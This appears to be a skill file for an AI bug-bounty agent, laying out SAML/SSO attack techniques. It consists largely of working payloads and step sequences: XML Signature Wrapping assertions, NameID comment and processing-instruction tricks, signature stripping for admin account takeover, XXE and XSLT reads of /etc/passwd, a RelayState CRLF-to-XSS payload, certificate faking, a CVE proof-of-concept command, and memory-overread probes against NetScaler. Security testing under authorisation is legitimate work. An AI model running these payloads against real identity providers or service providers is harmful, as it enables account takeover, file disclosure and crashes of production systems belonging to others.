---
name: saml
description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
---

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

---

## Related Skills & Chains

- **`account-takeover`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`oauth-oidc`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- Find every SAML handler: POSTs carrying `SAMLResponse` to the ACS (`/saml/acs`, `/sso/saml`, `/Shibboleth.sso`, `/_layouts/`, `/cgi/samlauth`), plus signed `AuthnRequest`, `LogoutRequest` and `AttributeQuery` endpoints. Use SAMLExtractor over a subdomain list; install SAML Raider in Burp.
- Decode the full transport chain before analyzing: URL decode → Base64 decode → raw inflate. Keep a legitimate signed baseline response for every test.
- Fingerprint the library where possible (error text, headers, known vendor build) and map to the current parser-differential CVEset: ruby-saml CVE-2024-45409, CVE-2025-25291/25292 (REXML vs Nokogiri), php-saml/xmlseclibs void-canonicalization CVEs, NetScaler CVE-2026-8452 etc.
- Enumerate the full assertion context the SP should enforce: signature scope (Response vs Assertion), `Destination`, `AudienceRestriction`, `InResponseTo`, `NotBefore`/`NotOnOrAfter`, `StatusCode=Success`, `Issuer`, `SubjectConfirmationData/Recipient`, `NameID`, `AuthnContext`, role AttributeStatements. Mutate each independently.
- Look for flaw sources of valid signatures: publicly available signed IdP metadata (`?sign=true`), signed error responses, and WS-Federation metadata — PortSwigger's 2025 "Fragile Lock" shows these suffice once signature consumption is broken.
- Inspect injection/extension points that survive schema validation: `Extensions` and `StatusDetail` (they appear before the Signature element), `RelayState` reflection sinks, `error`/logout `base`/`return_to` URL params, and depth/size limits on XML transforms.

- Compare all three signature states: valid baseline, corrupted `SignatureValue`, and zero `<ds:Signature>` elements. Acceptance of only the third proves fail-open logic; acceptance of the second proves signature verification is absent entirely.
- Check every schema extension point for injected assertions: `Extensions` and `StatusDetail` are the two that appear before the Signature element in a valid Response, which is what makes the Fragile Lock XSW pass schema validation.
- Test duplicate IDs and repeated Response/Assertion nodes: signature verification via `//*[@ID='...']` may select one node while business logic selects another. Vary element order and nesting.
- Replay a legitimately signed *error* Response (a malformed AuthnRequest often forces the IdP to sign one) as the signature source for a forged assertion — one valid IdP signature is enough for the Golden SAML Response technique.
- Test `Destination` pointed at another SP's ACS and an `AudienceRestriction` that excludes this SP — recipient confusion works when the SP only checks the signature, not the intended audience.
- Mutate `InResponseTo`: omit it, reference an unrelated AuthnRequest, or replay an old one — SP-initiated SSO must bind the response to a still-pending request.
- Check time conditions independently: future `NotBefore`, expired `NotOnOrAfter`, or entirely absent `<Conditions>` (some code only checks time when the element exists).
- Use the assertion-context matrix from HackTricks: for each property (signature, certificate/trust, issuer, destination, audience, time, InResponseTo, StatusCode) record whether a mutation is rejected — one enforced property does not imply the others are.
- Probe fail-open handlers when SSO is disabled or the verification certificate is missing/empty — CVE-2026-28323 (SolarWinds Web Help Desk) showed unconfigured endpoints can route attacker input straight to identity extraction.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Signature stripping: remove every `<ds:Signature>` or empty the `SignatureValue` — some SPs treat "no signature" as "nothing to verify" and fail open. Compare valid baseline, corrupted signature, and fully unsigned variants.
- XSW1–XSW8 (HackTricks/PortSwigger/Somorovsky): wrap the signed assertion in a new evil root; use a detached signature; add a sibling evil Assertion; nest the original inside the evil one; put the copy inside `Extensions` (XSW7, works against OpenSAML) or another lax element (XSW8). Use SAML Raider to apply variants.
- Attribute pollution (Fragile Lock): `<samlp:Response ID="attack" samlp:ID="ID">` — libxml2 `xmlGetProp`/Nokogiri `node['ID']` ignores namespaces and resolves by simple name with order-dependent, undefined results; REXML chooses the opposite order. Desynchronize which element is verified vs consumed.
- REXML namespace confusion without DTDs: `<Signature xml:xmlns='http://www.w3.org/2000/09/xmldsig#'/>` hides/shows Signature nodes differently across parsers; wrap a fake signature in `<Extensions>` with `xml:xmlns='#other'` nesting.
- Void Canonicalization Golden SAML Response: `xmlns:ns="1"` (relative URI) makes libxml2 canonicalization fail; Nokogiri returns an empty string, so the digest is the SHA-256 of empty string `47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=`. With a reused IdP signature, the response passes signature validation regardless of assertion claims.
- Canonicalization-vs-application text differentials: `<saml:NameID><?p not-an-?>admin@example.com</saml:NameID>` — signature layer sees `not-an-admin@example.com`, application reads `admin@example.com`; also test comments `<!--x-->`, split text nodes, CDATA boundaries, parse-serialize-parse round trips.
- CVE-2024-45409 PoC shape: `python3 CVE-2024-45409.py -r response.url_base64 -n admin@example.com -o response_patched.url_base64`, then replay the patched blob at the ACS.
- Certificate faking: in SAML Raider, import the cert → Save and Self-Sign → Remove Signatures → (Re-)Sign Message/Assertion with the self-signed clone. Success means SP never validates IdP trust.
- Recipient/target confusion: replay a response issued for SP-Legit at SP-Target sharing the same IdP; mutate `Destination` to another ACS and exclude the SP from `AudienceRestriction`.
- XXE/XSLT/DoS: DOCTYPE entities in the SAMLResponse; transform-time XSLT using `unparsed-text('/etc/passwd')` (runs *before* signature verification, so a self-signed/invalid signature suffices); transform bombs with recursion depth 27; RelayState CRLF → `Content-Type: text/html` rXSS (base64-encoded `%0AContent-Type%3A+text%2Fhtml...`).

- Test all signed message handlers, not just login responses: a signed `AuthnRequest`, `AttributeQuery`, or `LogoutRequest` containing a valid signature can be nested inside an attacker-controlled outer message to disclose attributes or terminate another user's session.
- XXE via DOCTYPE entities in the deflated/base64 SAMLResponse (`<!ENTITY file SYSTEM "file:///etc/passwd">`) — confirm with an OOB callback or error-based file read.
- XSLT transform before signature verification: inject `<xsl:stylesheet>` with `unparsed-text('/etc/passwd')` and `encode-for-uri()` into `ds:Transform` — a self-signed or invalid signature is sufficient because transforms execute first.
- RelayState CRLF → reflected XSS: base64-encode a URL-encoded sequence starting with `%0AContent-Type%3A+text%2Fhtml` followed by `<svg/onload=alert(1)>`, POST it with a syntactically valid SAMLResponse to `/cgi/logout`, and deliver via auto-submitting CSRF form (NetScaler pattern).
- Pre-verification parser memory bugs: carefully structured but *unsigned* signatures still reach canonicalization — e.g. CVE-2026-8452's `ec:InclusiveNamespaces @PrefixList` overflow. Use the published fixed-length probe plus a control request, never a length sweep.
- WS-Federation valueless-parameter overread: `GET /wsfed/passive?wctx` (no `=`, no value) returns a 302 whose Base64 `NSC_TASS` cookie may contain heap fragments — sample multiple responses and search decoded blobs for `Cookie:` / `Authorization:`.
- NetScaler RelayState failure-path length oracle: decoded `ctx=` + 16 NUL bytes (20 bytes total) with `SAMLResponse=AAAA` is the safe 20-byte probe; nearby lengths can create anonymous sessions or crash nsppe.
- Unterminated/unquoted SAMLRequest attribute overread on IdP parsers: replace an attribute separator with a newline/tab and append another attribute, then decode the reflected cookie/redirect to look for bytes that were not in your request.
- Forged-response workflow: GET login page (keep cookie) → parse form action and CSRF token → build schema-valid Response with target NameID and no signatures → Base64 for HTTP-POST binding → POST with the same cookie jar → request a protected page.

### C. Validation / proof bar — how to confirm and avoid false positives

- Reach a protected resource as a *known existing* federated user. Auto-provisioning an unknown `NameID` yields an authenticated-looking but unusable session; prefer `DOMAIN\Administrator` or `user@domain` when local usernames are blocked.
- Require `StatusCode=Success` on the same verified response; a signed error response must not authorize an assertion found elsewhere in the document.
- Distinguish a missing signature from a bad signature — acceptance of only the fully unsigned variant proves a fail-open validator branch, not broken cryptography.
- For CVE patch oracles, use the non-destructive fixed-length probes with a control request; identical results for probe and control mean INCONCLUSIVE, not PATCHED. Never length-sweep a production appliance (crash/session-creation branches exist).
- Do not count edits to display name/locale or theoretical XML changes; the auth-decision-changing step (NameID, AuthnContext, role AttributeStatement, or session issuance) is the gate.
- Confirm parser-dependent results against the actual library/version and re-test with a second clean session; preserve the exact SAMLResponse and the protected-resource response as evidence.

- A session issued for an auto-provisioned unknown user is not proof — resume with a known, existing federated account and access a protected resource as that identity.
- Verify the final identity after parsing: some SPs canonicalize or restrict NameID (e.g. reject values containing `@` or `\`), so a forged admin string may be accepted but resolve to no usable account.
- For CVE patch oracles, a flat response (probe and control identical) means INCONCLUSIVE, not PATCHED. Confirm with local build/version where authorized.
- Do not claim signature bypass from a modified response that returns a login page — require a protected resource and the expected identity/role in the response or audit data.
- Separate "unsigned accepted" from "self-signed accepted": the first means no validation at all (High/Critical), the second means trust-chain validation is missing (also Critical but a different root cause).
- Comment/PI differentials are parser/library-specific — reproduce against the detected SAML library version and keep the exact raw SAMLResponse in evidence; do not generalize from one framework.
- For XSW, confirm the SP consumed the *evil* assertion (attacker NameID) rather than merely returning 200 with a generic error or a session for your own test user.
- Treat parser-level DoS/memory-disclosure probes as high-risk on production appliances: use only the published safe probes, avoid length sweeps, and coordinate with the program.
- Redact the SAMLResponse's signature bytes, certificates, and any other-user PII in reports, but keep enough of the XML structure for triage to understand which node was modified.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/the-fragile-lock
2. https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html
